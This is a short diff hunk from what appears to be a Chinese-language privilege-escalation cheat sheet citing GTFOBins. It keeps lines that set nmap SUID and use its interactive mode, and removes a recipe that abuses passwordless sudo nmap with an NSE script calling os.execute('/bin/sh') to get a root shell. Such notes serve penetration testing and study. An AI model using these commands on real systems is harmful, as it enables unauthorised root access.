@@ -43,13 +43,6 @@ https://gtfobins.github.io/
 ## 老版本
     chmod +s /usr/bin/nmap
     nmap --interactive
-## 如果nmap不需要root密码即可执行
-    sudo -l
-
-如果发现(root)NOPASSWD:/usr/bin/nmap
-
-    echo 'os.execute("/bin/sh")' > getShell.nse
-    sudo -u root nmap --script=getShell.nse
 # vim
 ## 1
 
